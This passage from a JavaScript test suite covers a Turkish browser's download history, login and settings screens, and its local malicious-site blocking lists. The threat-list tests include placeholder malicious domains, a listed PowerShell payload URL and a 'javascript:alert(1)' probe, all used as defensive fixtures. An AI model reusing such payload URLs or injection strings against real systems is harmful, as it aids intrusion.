    { filename: 'a.pdf', state: 'completed', received: 10, total: 10, savePath: 'C:/a.pdf', sourceHost: 'a.com', startedAt: 2, item: {}, gizli: 'x' },
    { filename: 'b.bin', state: 'progressing', startedAt: 3 },
    { filename: '', state: 'completed' },
    { filename: 'c.zip', state: 'cancelled', received: 'x', startedAt: 1 },
  ]);
  eq('kalıcı geçmiş: yalnızca biten indirmeler, bilinen alanlar, sıralı',
    [hist.map((d) => d.filename), Object.keys(hist[1]).sort().join(','), hist[0].received],
    [['c.zip', 'a.pdf'], 'endedAt,filename,received,savePath,sourceHost,startedAt,state,total', 0]);
  eq('kalıcı geçmiş en fazla 200 kayıt, en yeniler kalır',
    ss.sanitizeDownloadHistory(Array.from({ length: 230 }, (_, i) => ({ filename: 'f' + i, state: 'completed', startedAt: i }))).map((d) => d.filename)[0], 'f30');

  const osMod = require('os');
  const dir = fs.mkdtempSync(path.join(osMod.tmpdir(), 'ilg-log-'));
  const { SecureLogManager: LogManager } = require('../src/main/secure-log-manager.js');
  const lm = new LogManager(dir);
  const e1 = lm.addVisit({ url: 'https://a.com/', domain: 'a.com', title: 'A' });
  const e2 = lm.addVisit({ url: 'https://b.com/', domain: 'b.com', title: 'B' });
  eq('ziyaret günlüğünden tek kayıt silinir', [lm.deleteEntries([e1.id]), lm.search({}).items.map((x) => x.id)], [1, [e2.id]]);
  check('silinen kayıt senkron kuyruğundan da çıkar', !lm.syncQueue.includes(e1.id) && lm.syncQueue.includes(e2.id));
  fs.rmSync(dir, { recursive: true, force: true });

  const mainJs = read('main/main.js');
  check('güvensiz kaynaktan tehlikeli indirme onaysız başlamıyor',
    /downloadNeedsWarning\(\{ filename, url: sourceUrl \}\)[\s\S]{0,900}event\.preventDefault\(\)/.test(mainJs));
  check('tehlikeli dosya indirilenler sayfasından onaysız açılmıyor',
    /'downloads-open'[\s\S]{0,400}isDangerousFile\(d\.filename\)[\s\S]{0,300}showMessageBox/.test(mainJs));
  check('gizli pencere indirmeleri ana pencereye gönderilmiyor ve kaydedilmiyor',
    mainJs.includes('if (!entry.incognito && mainWindow && !mainWindow.isDestroyed())') && mainJs.includes('filter((d) => !d.incognito)'));
  check('indirme geçmişi ziyaret günlüğü anahtarıyla şifreli yazılıyor', mainJs.includes('writeProtectedJson(DOWNLOADS_ENC, DOWNLOADS_PLAIN, list)'));
  const appJs = read('renderer/app.js');
  check('geçmiş ve indirilenler sayfaları artık "Yakında" değil',
    appJs.includes("showScreen('history', renderHistoryPage)") && appJs.includes("showScreen('downloads', renderDownloadsPage)") && !/history:\s*'Geçmiş'/.test(appJs));
  check('geçmişten açılan adres yalnızca http(s)', appJs.includes('if (!isWebHref(url)) return;'));
  check('boş sekme ve hata belgesi ziyaret günlüğüne yazılmıyor', read('main/main.js').includes('if (!isIncognito && isWebUrl(tab.url)) {'));
  // Ana süreç duraklatılan indirmeyi 'paused' durumuyla gönderir; sayfa bunu süren indirme saymazsa
  // Sürdür ve İptal düğmeleri kaybolur (uçtan uca sonda yakaladı).
  check('duraklatılan indirme süren indirme sayılıyor (Sürdür/İptal kaybolmaz)', (appJs.match(/d\.state === 'progressing' \|\| d\.state === 'paused'/g) || []).length >= 2);
}

// ══════════════════════════════════════════════════════════════════════════════
// Giriş ekranı — isteğe bağlı, sayfa görünümünün altında kalmamalı
// ══════════════════════════════════════════════════════════════════════════════
suite('Giriş ekranı');
{
  const authJs = read('renderer/auth-screen.js');
  const initBody = authJs.slice(authJs.indexOf('async function initAuth('), authJs.indexOf('window.ilgezdiAuth = {'));
  check('açılışta giriş ekranı kendiliğinden gösterilmiyor', initBody.length > 50 && !initBody.includes('showAuthScreen('));
  const logoutBody = authJs.slice(authJs.indexOf('logout: async'), authJs.indexOf('getSession: loadSession'));
  check('çıkışta giriş ekranı dayatılmıyor', logoutBody.length > 20 && !logoutBody.includes('showAuthScreen('));
  check('giriş Ayarlar › Hesap üzerinden açılabiliyor', read('renderer/settings-panel.js').includes('window.ilgezdiAuth?.open?.()') && authJs.includes('open: () => {'));
  const appJs = read('renderer/app.js');
  const hideBody = appJs.slice(appJs.indexOf('function hideScreen('), appJs.indexOf('// ─── VPN Göstergesi'));
  check('ekran kapanınca giriş ekranı açıksa sayfa görünümü gösterilmiyor', hideBody.includes('if (!isAuthScreenOpen()) {'));
  check('sekme adres güncellemesinde de aynı koruma', appJs.split('isAuthScreenOpen()').length - 1 >= 3);
  check('koruma animasyon sırasında da geçerli (hidden sınıfına bakıyor)', appJs.includes("return !!el && !el.classList.contains('hidden');"));
  // Kullanıcı bildirdi: Ayarlar › Hesap › "Giriş Yap" Ayarlar panelini kapatıyordu.
  const setJs = read('renderer/settings-panel.js');
  const accBody = setJs.slice(setJs.indexOf('async function bindAccountEvents('), setJs.indexOf('// ─── Özelleştirme eventleri'));
  check('Hesap sekmesindeki giriş/çıkış düğmeleri Ayarlar panelini kapatmıyor', accBody.length > 100 && !accBody.includes('ilgezdiCloseAllPanels'));
  check('giriş, kayıt, QR girişi ve çıkış sonrası Hesap sekmesi yenileniyor',
    (authJs.match(/notifyAuthChanged\(\);/g) || []).length >= 4 && setJs.includes("addEventListener('ilgezdi-auth-changed'"));
  check('Esc önce giriş penceresini kapatıyor',
    /if \(isAuthScreenOpen\(\)\) window\.ilgezdiAuth\?\.close\?\.\(\);\s*else if \(!findBar\.hidden\)/.test(appJs) && authJs.includes('close: hideAuthScreen'));
  check('giriş penceresi kapanınca odak onu açan düğmeye dönüyor', authJs.includes('back?.isConnected'));
}

// ══════════════════════════════════════════════════════════════════════════════
// Ayarlar paneli — sekme çubuğu 420 px panele sığmalı, olaylar birikmemeli
// ══════════════════════════════════════════════════════════════════════════════
suite('Ayarlar paneli');
{
  const setJs = read('renderer/settings-panel.js');
  const tabs = [...setJs.matchAll(/<button class="settings-tab[^"]*" data-tab="(\w+)" role="tab" aria-selected="(?:true|false)">/g)].map((m) => m[1]);
  eq('6 sekme, sekme rolüyle işaretli', tabs, ['customization', 'account', 'general', 'privacy', 'passwords', 'diag']);
  check('sekme çubuğu eşit sütunlu ızgara (yan yana metin 434 px tutup taşıyordu)',
    /\.settings-tabs \{[^}]*grid-template-columns:repeat\(6, minmax\(0, 1fr\)\)/.test(setJs));
  check('sekme adı sütuna sığmazsa kesilmek yerine üç nokta', /\.settings-tab-label \{[^}]*text-overflow:ellipsis/.test(setJs));
  check('panel olayları yalnızca bir kez bağlanıyor (her açılışta Kaydet dinleyicisi birikiyordu)',
    /function initSettingsPanelEvents\(\) \{\s*if \(_settingsEventsBound\) return;\s*_settingsEventsBound = true;/.test(setJs));
  check('sekme seçimi vurguyu ve aria-selected değerini birlikte güncelliyor',
    /function selectSettingsTab\([^)]*\) \{[\s\S]{0,400}aria-selected[\s\S]{0,200}renderSettingsTab\(/.test(setJs));
  check('panel her açılışta Özelleştir sekmesi vurgulu açılıyor', setJs.includes("selectSettingsTab('customization');"));
}

// ══════════════════════════════════════════════════════════════════════════════
// Zararlı site koruması — yerel tehdit listeleri (Google Safe Browsing yok)
// ══════════════════════════════════════════════════════════════════════════════
suite('Zararlı site koruması — liste ayrıştırma ve eşleşme');
{
  const tl = require('../src/main/threat-lists.js');
  eq('satır biçimleri',
    ['# yorum', '', '0.0.0.0 kotu.example', '127.0.0.1 localhost', '||oltalama.example^', 'https://www.kotu2.example/',
     'http://kotu3.example/giris.php?id=1', 'kotu4.example/panel/', '*.joker.example', '203.0.113.7', 'http://192.168.1.1/x',
     'drive.google.com', 'https://drive.google.com/file/d/abc', 'başlık,sütun iki', '0.0.0.0 kotu5.example # not']
      .map((l) => { const e = tl.parseListLine(l); return e && e.key; }),
    [null, null, 'h|kotu.example', null, 'h|oltalama.example', 'h|kotu2.example',
     'u|kotu3.example/giris.php?id=1', 'u|kotu4.example/panel', 'h|joker.example', 'h|203.0.113.7', null,
     null, 'u|drive.google.com/file/d/abc', null, 'h|kotu5.example']);

  const list = ['kotu.example', 'http://paylasim.example/zararli/dosya.exe', 'https://sorgulu.example/a?x=1',
    'raw.githubusercontent.com', 'https://raw.githubusercontent.com/kotu/repo/main/yuk.ps1', 'secure-login.com.tr', 'kotu.example'].join('\r\n');
  const c = tl.compileList(list);
  eq('derleme sayıları (tekrar tek sayılır, paylaşımlı alan adı atlanır)', [c.index.length, c.hosts, c.urls, c.skipped], [5, 3, 3, 1]);
  const inc = tl.createListCompiler();
  list.split('\n').forEach((l) => inc.add(l));
  eq('satır satır derleme tek seferlikle aynı', Array.from(inc.finish().index), Array.from(c.index));

  const m = tl.createMatcher();
  m.set('test', c.index);
  eq('alan adı girdisi alt alan adlarını da kapsar, benzer adları kapsamaz',
    ['https://kotu.example/', 'http://a.b.kotu.example/x?y', 'https://kotu.example.org/', 'https://iyikotu.example/'].map((u) => (m.match(u) || {}).kind || null),
    ['host', 'host', null, null]);
  eq('adres girdisi yalnızca o yol; sorgusuz girdi her sorgu dizesiyle',
    ['https://paylasim.example/zararli/dosya.exe', 'https://paylasim.example/zararli/dosya.exe?dl=1#x', 'https://paylasim.example/', 'https://paylasim.example/zararli/baska.exe'].map((u) => (m.match(u) || {}).kind || null),
    ['url', 'url', null, null]);
  eq('sorgulu girdi yalnızca aynı sorguyla', ['https://sorgulu.example/a?x=1', 'https://sorgulu.example/a?x=2', 'https://sorgulu.example/a'].map((u) => !!m.match(u)), [true, false, false]);
  eq('paylaşımlı barındırma: alan adının tamamı engellenmez, listelenen dosya engellenir',
    [!!m.match('https://raw.githubusercontent.com/iyi/repo/x.js'), !!m.match('https://raw.githubusercontent.com/kotu/repo/main/yuk.ps1')], [false, true]);
  eq('iki parçalı uzantının (com.tr) üstüne çıkılmaz', tl.hostCandidates('a.secure-login.com.tr'), ['a.secure-login.com.tr', 'secure-login.com.tr']);
  check('www ve büyük harf farkı eşleşmeyi bozmaz', !!m.match('HTTPS://WWW.KOTU.EXAMPLE/'));
  eq('web dışı ve yerel adresler denetlenmez', [m.match('file:///C:/kotu.example'), m.match('http://localhost/'), m.match('chrome-error://chromewebdata/'), m.match('çöp')], [null, null, null, null]);
  eq('kaynak kaldırılınca eşleşme yok', (() => { const k = tl.createMatcher(); k.set('a', c.index); k.remove('a'); return k.match('https://kotu.example/'); })(), null);

  const bytes = tl.indexToBytes(c.index);
  const shifted = Buffer.alloc(bytes.byteLength + 3);
  shifted.set(bytes, 3);
  eq('dizin diske yazılıp hizasız tampondan geri okunur', Array.from(tl.indexFromBytes(shifted.subarray(3), c.index.length) || []), Array.from(c.index));
  eq('bozuk dizin reddedilir (boyut, sayı, sıra)', [tl.indexFromBytes(new Uint8Array(12)), tl.indexFromBytes(bytes, c.index.length + 1), tl.indexFromBytes(new Uint8Array(16))], [null, null, null]);

  // Büyük liste: bellek girdi başına 8 bayt, arama hızlı
  const big = tl.createListCompiler();
  for (let i = 0; i < 200000; i++) big.add('kotu' + i + '.example');
  const bigIndex = big.finish().index;
  const bm = tl.createMatcher();
  bm.set('big', bigIndex);
  const t0 = Date.now();
  let hits = 0;
  for (let i = 0; i < 20000; i++) if (bm.match('https://cdn.site' + i + '.example/a/b.js?v=' + i)) hits++;
  const ms = Date.now() - t0;
  check('200 bin girdi 1,6 MB; 20 bin arama 1 sn altında ve yanlış eşleşme yok', bigIndex.byteLength === 1600000 && hits === 0 && ms < 1000, ms + ' ms, ' + hits + ' eşleşme');
  check('listedeki alan adı büyük dizinde bulunuyor', !!bm.match('https://www.kotu199999.example/giris'));
}

suite('Zararlı site koruması — güncelleme ve uyarı sayfası');
{
  const tl = require('../src/main/threat-lists.js');
  const H = 3600 * 1000;
  const src = { intervalHours: 12 };
  eq('hiç indirilmediyse hemen', tl.nextUpdateAt(src, undefined), 0);
  eq('başarılıysa aralık kadar sonra', tl.nextUpdateAt(src, { fetchedAt: 1000 }), 1000 + 12 * H);
  eq('hatada 15 dk, 30 dk, 1 sa… en fazla kaynak aralığı',
    [1, 2, 3, 9].map((f) => tl.nextUpdateAt(src, { fetchedAt: 1, lastAttemptAt: 5000, failures: f }) - 5000),
    [15 * 60 * 1000, 30 * 60 * 1000, 60 * 60 * 1000, 12 * H]);
  eq('7 günden eski liste güncel sayılmaz', [tl.isStale({ fetchedAt: 10 }, 10 + 6 * 24 * H), tl.isStale({ fetchedAt: 10 }, 10 + 8 * 24 * H), tl.isStale(undefined, 0)], [false, true, true]);

  const pm = tl.threatPageModel({ url: 'https://kotu.example/giris', sourceName: 'Deneme listesi', kind: 'host', token: 'abc' });
  eq('uyarı sayfası modeli', [pm.kind, pm.host, pm.canRetry, pm.proceedMessage], ['threat', 'kotu.example', false, tl.PROCEED_PREFIX + 'abc']);
  check('uyarıda adresin hiçbir sunucuya gönderilmediği yazıyor', pm.tips.some((t) => t.includes('hiçbir sunucuya gönderilmedi')));
  eq('web dışı adres modele girmez', tl.threatPageModel({ url: 'javascript:alert(1)', sourceName: 'x', kind: 'url' }).url, '');
  const script = ss.errorPageScript(pm);
  check('uyarı betiği "devam et" isteğini belirteçli konsol mesajıyla gönderiyor',
    script.includes('console.info(m.proceedMessage)') && script.includes('"proceedMessage":"ilgezdi-threat-proceed:abc"'));
  check('belirteçsiz hata sayfalarında "devam et" düğmesi yok', !JSON.stringify(ss.errorPageModel({ code: -105, url: 'https://a.com' })).includes('proceedMessage'));
}

suite('Zararlı site koruması — kaynak politikası');
{
  const tl = require('../src/main/threat-lists.js');
  check('en az bir kaynak var', tl.SOURCES.length >= 1);
  for (const s of tl.SOURCES) {
    const urls = s.urls || [s.url];
    check(s.id + ': tüm adresler https', urls.length > 0 && urls.every((u) => /^https:\/\//.test(u)));
    check(s.id + ': Google ya da koşulları uygun olmayan kaynak yok (Safe Browsing, OpenPhish, PhishTank, abuse.ch, Spamhaus)',
      urls.every((u) => !/google|safebrowsing|openphish|phishtank|abuse\.ch|spamhaus/i.test(u)));
    check(s.id + ': adreste anahtar ya da kimlik bilgisi yok', urls.every((u) => !/[?&](key|token|auth|apikey)=|auth-key/i.test(u)));
    check(s.id + ': en sık 6 saatte bir güncelleme, boyut üst sınırı ve kayıt alt sınırı tanımlı', s.intervalHours >= 6 && s.maxBytes > 0 && s.minEntries > 0);
    check(s.id + ': ad, kapsam, lisans ve kaynak sayfası ayarlarda gösterilebilir', !!(s.name && s.covers && s.license && /^https:\/\//.test(s.homepage)));
  }
  const status = tl.statusSummary(tl.SOURCES, {}, Date.now());
  check('durum özeti liste içeriği ya da adres taşımıyor', status.every((x) => Object.keys(x).sort().join() === 'covers,entries,homepage,id,lastError,license,name,stale,updatedAt'));
  const mainAll = fs.readdirSync(path.join(SRC, 'main')).filter((f) => f.endsWith('.js')).map((f) => read('main/' + f)).join('\n');
  check('ana süreçte Google Safe Browsing kullanımı yok', !/safebrowsing\.googleapis|safeBrowsing|safe-browsing/i.test(mainAll));
}

suite('Zararlı site koruması — ana süreç bağlantıları');
{
  const mainJs = read('main/main.js');
  const beforeBlocker = mainJs.slice(mainJs.indexOf('ses.webRequest.onBeforeRequest('), mainJs.indexOf('shouldBlockUrl(details.url'));
  check('istek denetimi engelleyiciden önce ve ana çerçeve dahil', beforeBlocker.includes('threats.check(details.url, ses)') && !beforeBlocker.includes("'mainFrame') return"));
  check('engellenen ana çerçevede hata sayfası yerine uyarı sayfası', /errorCode === -20 && threats \? threats\.takeBlock\(view\.webContents\)/.test(mainJs));
  check('"devam et" konsol mesajı işleniyor, sekme kapanınca kayıt siliniyor',
    mainJs.includes('threats.handleConsoleMessage(view.webContents, message)') && mainJs.includes('threats.forget(viewWcId)'));
  check('açılışta kuruluyor, varsayılan açık, ayar doğrulanıyor',
    mainJs.includes('threats.start();') && /threatProtection:\s+true,/.test(mainJs) && mainJs.includes('incoming.threatProtection = incoming.threatProtection !== false'));
  const tp = read('main/threat-protection.js');
  check('listeler bellek içi ayrı oturumla, çerezsiz ve önbelleksiz indiriliyor',
    tp.includes("FETCH_PARTITION = 'ilgezdi-threat-lists'") && tp.includes("credentials: 'omit'") && tp.includes("cache: 'no-store'"));
  check('engel günlüğüne adres yazılmıyor', tp.includes("info('Zararlı site engellendi', { source: hit.sourceId, kind: hit.kind })"));
  check('küçük ya da bozuk indirme mevcut listenin yerine geçmiyor', tp.includes('MIN_KEEP_RATIO') && tp.includes('compiled.index.length < floor'));
  check('"devam et" izni diske yazılmıyor, oturuma bağlı', tp.includes('const bypass = new WeakMap()') && !/bypass[\s\S]{0,80}writeFile/.test(tp));
  const setJs = read('renderer/settings-panel.js');
  check('ayarlarda anahtar, durum kutusu ve elle güncelleme var; ayar kaydediliyor',
    setJs.includes("row('cfg-threat'") && setJs.includes('populateThreatStatus();') && setJs.includes("getElementById('cfg-threat')?.checked"));
}

// ══════════════════════════════════════════════════════════════════════════════
// USOM listesi İlgezdi sunucusunda derlenir; uygulama yalnızca o dosyayı indirir
// ══════════════════════════════════════════════════════════════════════════════
suite('Zararlı site koruması — İlgezdi sunucusundaki USOM listesi');
{
  const ROOTD = path.join(__dirname, '..');
  const tl = require('../src/main/threat-lists.js');
  const usom = tl.SOURCES.find((s) => s.id === 'ilgezdi-usom');
  const mainSrcAll = fs.readdirSync(path.join(SRC, 'main')).filter((f) => f.endsWith('.js')).map((f) => read('main/' + f)).join('\n');
  check('uygulama listeyi yalnızca İlgezdi sunucusundan indiriyor, USOM API\'sine gitmiyor',
    !!usom && usom.urls.every((u) => /^https:\/\/(www\.ilgezdi\.com\.tr|ilgezdi\.vercel\.app)\/lists\/usom\.txt\.gz$/.test(u))
    && !mainSrcAll.includes('siberguvenlik.gov.tr'));

  const b = require('../scripts/build-threat-lists.js');
  eq('USOM kaydı → liste satırı',
    [
      { type: 'domain', url: 'Kotu-Banka.COM.' }, { type: 'url', url: 'kotu.example/Giris?x=1' }, { type: 'ip', url: '203.0.113.9' },
      { type: 'ip6', url: 'a83f:8110::1' }, { type: 'ip6net', url: '2001:db8::/32' }, { type: 'domain', url: 'bosluk var.com' },
      { type: 'domain', url: 'tekparca' }, { type: 'url', url: '' }, { type: 'domain', url: 'x\x00.com' }, null,
    ].map(b.toLine),
    ['kotu-banka.com', 'kotu.example/Giris?x=1', '203.0.113.9', '[a83f:8110::1]', null, null, null, null, null, null]);
  eq('sunucunun ürettiği satırları uygulama okuyabiliyor (IPv6 dahil)',
    ['kotu-banka.com', 'kotu.example/Giris?x=1', '203.0.113.9', '[a83f:8110::1]'].map((l) => { const e = tl.parseListLine(l); return e && e.key; }),
    ['h|kotu-banka.com', 'u|kotu.example/Giris?x=1', 'h|203.0.113.9', 'h|a83f:8110::1']);
  eq('köşeli parantezli bölüm başlıkları hâlâ atlanıyor', [tl.parseListLine('[Adblock Plus 2.0]'), tl.parseListLine('[genel]')], [null, null]);
  const bs = fs.readFileSync(path.join(ROOTD, 'scripts', 'build-threat-lists.js'), 'utf8');
  check('USOM başarısızsa, sayfalar eksikse ya da liste yarıdan küçükse canlı liste korunuyor; site dağıtımı durmuyor',
    (bs.match(/return keepLive\(/g) || []).length >= 3 && bs.includes('process.exitCode = 0') && b.MIN_KEEP_RATIO === 0.5 && b.MIN_COVERAGE === 0.95);
  check('liste dosyasında zaman damgası yok (içerik aynıysa ETag değişmez)', !/generatedAt[\s\S]{0,40}'#/.test(bs) && !bs.includes("'# Derlenme"));

  // Cron ucu: yalnızca Vercel Cron'un gizli anahtarıyla; kanca adresi yanıta yazılmaz.
  const cron = require('../api/cron/threat-lists.js');
  const prev = { secret: process.env.CRON_SECRET, hook: process.env.THREAT_LISTS_DEPLOY_HOOK, err: console.error };
  const call = (auth) => {
    const r = { code: 0, body: null, setHeader() {}, status(c) { this.code = c; return this; }, json(x) { this.body = x; return this; } };
    cron({ headers: auth === undefined ? {} : { authorization: auth } }, r);
    return r;
  };
  console.error = () => {};
  delete process.env.THREAT_LISTS_DEPLOY_HOOK;
  delete process.env.CRON_SECRET;
  const noSecret = call('Bearer ').code;
  process.env.CRON_SECRET = 'deneme-gizli';
  const wrong = [call().code, call('Bearer yanlis').code, call('bearer deneme-gizli').code];
  const noHook = call('Bearer deneme-gizli');
  console.error = prev.err;
  if (prev.secret === undefined) delete process.env.CRON_SECRET; else process.env.CRON_SECRET = prev.secret;
  if (prev.hook !== undefined) process.env.THREAT_LISTS_DEPLOY_HOOK = prev.hook;
  eq('cron ucu: anahtar tanımsız ya da yanlışsa 401', [noSecret, ...wrong], [401, 401, 401, 401]);
  check('cron ucu: doğru anahtarla kanca tanımsızsa 500 ve yanıtta adres yok', noHook.code === 500 && !JSON.stringify(noHook.body).includes('http'));

  const vj = JSON.parse(fs.readFileSync(path.join(ROOTD, 'vercel.json'), 'utf8'));
  check('site derlemesi listeyi üretiyor, günlük cron tanımlı (Hobby planı günde bir)',
    vj.buildCommand === 'node scripts/build-threat-lists.js' && vj.outputDirectory === 'site'
    && (vj.crons || []).some((c) => c.path === '/api/cron/threat-lists' && /^\d+ \d+ \* \* \*$/.test(c.schedule)));
  check('derleme betiği Vercel\'e yükleniyor (.vercelignore dışarıda bırakmıyor)', !/^\/?scripts\/?$/m.test(fs.readFileSync(path.join(ROOTD, '.vercelignore'), 'utf8')));
  check('üretilen liste git\'e girmiyor', fs.readFileSync(path.join(ROOTD, '.gitignore'), 'utf8').split(/\r?\n/).includes('site/lists/'));
}

suite('Site — sürüm notları');
{
  const html = fs.readFileSync(path.join(__dirname, '..', 'site', 'surumler.html'), 'utf8');
  const js = html.slice(html.indexOf('const RELEASES = ['), html.indexOf('const LABEL'));
  let releases = null;
  try { releases = new Function(js + '; return RELEASES;')(); } catch (e) { releases = e.message; }
  check('RELEASES dizisi geçerli JavaScript', Array.isArray(releases), String(releases).slice(0, 120));
  if (Array.isArray(releases)) {
    const versions = releases.map((r) => r.version);
    check('sürümler yeniden eskiye ve tekrarsız', versions.join() === [...new Set(versions)].join() && versions[0] === '0.8.0');
    check('0.8.0 yayınlandı ve "En son" etiketi onda', !releases[0].upcoming && releases.find((r) => !r.upcoming).version === '0.8.0');
    const indexHtml = fs.readFileSync(path.join(__dirname, '..', 'site', 'index.html'), 'utf8');
    const pkgVersion = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8')).version;
    check('ana sayfadaki sürüm rozeti paket sürümüyle ve sürüm notlarıyla aynı', indexHtml.includes(`const VERSION = '${pkgVersion}';`) && releases[0].version === pkgVersion);
    check('her değişikliğin türü tanımlı ve metni dolu', releases.every((r) => r.changes.every((c) => ['new', 'fix', 'sec', 'imp'].includes(c.t) && c.d.length > 20)));
    check('0.8.0 güncellemeleri tek tek listelenmiş (zararlı site koruması ve USOM dahil)', releases[0].changes.length >= 25 && releases[0].changes.some((c) => c.d.includes('USOM')));
  }
  check('işleyici "Geliştiriliyor" etiketini ve yayınlanmış ilk sürüme "En son"u veriyor', html.includes("const LATEST = RELEASES.findIndex((r) => !r.upcoming);") && html.includes('rel-upcoming-tag'));
}

// ══════════════════════════════════════════════════════════════════════════════
// Kullanıcı bildirimi (15 Eyl): sık kullanılanlar çubuğu boş, Gizlilik'teki liste
// sayıları güncellenmiyor
// ══════════════════════════════════════════════════════════════════════════════
suite('Sık kullanılanlar çubuğu');
{
  const bmJs = read('renderer/bookmarks-panel.js');
  const bar = bmJs.slice(bmJs.indexOf('function bmRenderBar('), bmJs.indexOf('// ─── Init'));
  check('çubuk dolduruluyor (eskiden HTML\'de boş yer tutucuydu)', bar.length > 300 && bmJs.includes('  bmRenderBar();'));
  // Tanıma işlevi tarayıcı bağlamı olmadan çalıştırılır (yalnızca saf ad denetimi).
  const nameFn = new Function(bmJs.slice(bmJs.indexOf('const BM_BAR_FOLDER_EN'), bmJs.indexOf('function bmBarFolderId(')) + '; return bmIsBarFolderName;')();
  eq('çubuk klasörü adları: Brave/Chrome, Edge, Firefox, İlgezdi, İngilizce; benzer adlar değil',
    ['Yer işaretleri çubuğu', 'Yer İmi Çubuğu', 'Sık kullanılanlar çubuğu', 'Yer imleri araç çubuğu', '⭐ Bookmarks Bar', 'Favorites bar', 'Çubuğu', 'Snickers bar tarifleri', 'Diğer Yer İmleri', 'Gaming'].map(nameFn),
    [true, true, true, true, true, true, true, false, false, false]);
  check('çubuk textContent ile kuruluyor, yalnızca http(s) adresler, dış favicon servisi yok',
    !bar.includes('innerHTML') && bar.includes('H.safeUrl(i.url)') && bar.includes('label.textContent') && !/google|favicons\?/i.test(bar));
  check('yer imi kaydedilince, senkronda ve başka pencerede değişince çubuk yenileniyor',
    (bmJs.match(/dispatchEvent\(new CustomEvent\('ilgezdi-bookmarks-changed'\)\)/g) || []).length >= 2
    && bmJs.includes("addEventListener('ilgezdi-bookmarks-changed', bmRenderBar)") && bmJs.includes("addEventListener('storage'"));
  check('orta tık ve Ctrl/Shift+tık yeni sekmede açıyor', bmJs.includes("addEventListener('auxclick'") && /e\.ctrlKey \|\| e\.metaKey \|\| e\.shiftKey\) sb\?\.newTab/.test(bmJs));
  check('çubuğun sonunda tüm yer imlerini açan düğme (diğer klasörler panelde)',
    bmJs.includes("'bookmark-chip bookmark-chip-all'") && bmJs.includes("closest?.('.bookmark-chip-all')"));
  check('düğme bağlantı kutusunun dışında, çubuğun sağında; bağlantılar sığmayınca görünür kalıyor',
    bar.includes("all.id = 'bookmarks-bar-all'") && bar.includes('barEl.appendChild(all)')
    && /#bookmarks-bar-items \{[^}]*flex: 1;[^}]*overflow: hidden;/.test(read('renderer/styles/main.css')));
  check('düğme bağlantılardan SONRA ekleniyor (Tab sırası görsel sırayla aynı)',
    bar.indexOf('for (const item of items)') > 0 && bar.indexOf("'bookmark-chip bookmark-chip-all'") > bar.indexOf('for (const item of items)')
    && !/\.bookmark-chip-all\s*\{[^}]*order:/.test(read('renderer/styles/main.css')));
}

suite('Zararlı site koruması — canlı liste durumu');
{
  const tp = read('main/threat-protection.js');
  check('durum değişince bildiriliyor (başlangıç, her liste, bitiş)', (tp.match(/notifyStatus\(\);/g) || []).length >= 3 && /onStatus: \(fn\) =>/.test(tp));
  check('süren güncelleme varken "Şimdi güncelle" onun bitmesini bekliyor', tp.includes('if (inFlight) return inFlight;'));
  check('ana süreç açık pencerelere durum gönderiyor', read('main/main.js').includes('threats.onStatus((st) =>') && read('main/main.js').includes("'threats-status-changed'"));
  check('önyükleme köprüsü ve Ayarlar aboneliği (bir kez)',
    read('preload/preload.js').includes("ipcRenderer.on('threats-status-changed'") && /let _threatStatusSubscribed = false;[\s\S]{0,200}if \(_threatStatusSubscribed\) return;/.test(read('renderer/settings-panel.js')));
}

suite('Yayın — v0.8.0');
{
  const ROOTD = path.join(__dirname, '..');
  check('paket sürümü 0.8.0', JSON.parse(fs.readFileSync(path.join(ROOTD, 'package.json'), 'utf8')).version === '0.8.0');
  const wf = fs.readFileSync(path.join(ROOTD, '.github', 'workflows', 'release.yml'), 'utf8');
  check('yayın otomatik güncelleme dosyalarını da yüklüyor (latest*.yml, blockmap)', wf.includes('dist/latest*.yml') && wf.includes('dist/*.blockmap'));
}

// ══════════════════════════════════════════════════════════════════════════════
// Kaynak dosyalar — görünmez ham kontrol karakteri olmamalı
// Neden: regex aralıkları ([NUL-boşluk] gibi) ham baytla yazılınca git dosyayı
// ikili sanıyor ve bir düzenleyici bu baytları sessizce silerse güvenlik amaçlı
// bir regex'in anlamı fark edilmeden değişir. Kaçış dizisi (\x00) kullanılmalı.
// ══════════════════════════════════════════════════════════════════════════════
suite('Kaynak dosyalar — ham kontrol baytı yok');
{
  const ROOTD = path.join(__dirname, '..');
  const walk = (dir) => fs.readdirSync(dir, { withFileTypes: true }).flatMap((d) => {
    const p = path.join(dir, d.name);
    if (d.isDirectory()) return d.name === 'node_modules' ? [] : walk(p);
    return /\.(js|html|css|json|md|yml)$/.test(d.name) ? [p] : [];
  });
  const targets = ['src', 'api', 'test', 'scripts', '.github'].flatMap((d) => walk(path.join(ROOTD, d)));
  const offenders = [];
  for (const f of targets) {
    const buf = fs.readFileSync(f);
    for (let i = 0; i < buf.length; i++) {
      const c = buf[i];
      if ((c < 32 && c !== 9 && c !== 10 && c !== 13) || c === 127) { offenders.push(path.relative(ROOTD, f)); break; }
    }
  }
  check('ham kontrol baytı içeren kaynak dosyası yok (' + targets.length + ' dosya tarandı)', offenders.length === 0, offenders);
}

// ─── Özet ─────────────────────────────────────────────────────────────────────
console.log('\n' + '─'.repeat(60));
if (failed === 0) {
  console.log('\x1b[32m' + passed + ' test geçti.\x1b[0m');
} else {
  console.log('\x1b[31m' + failed + ' test BAŞARISIZ\x1b[0m, ' + passed + ' geçti:');
  failures.forEach((f) => console.log('  • ' + f));
}
process.exit(failed ? 1 : 0);

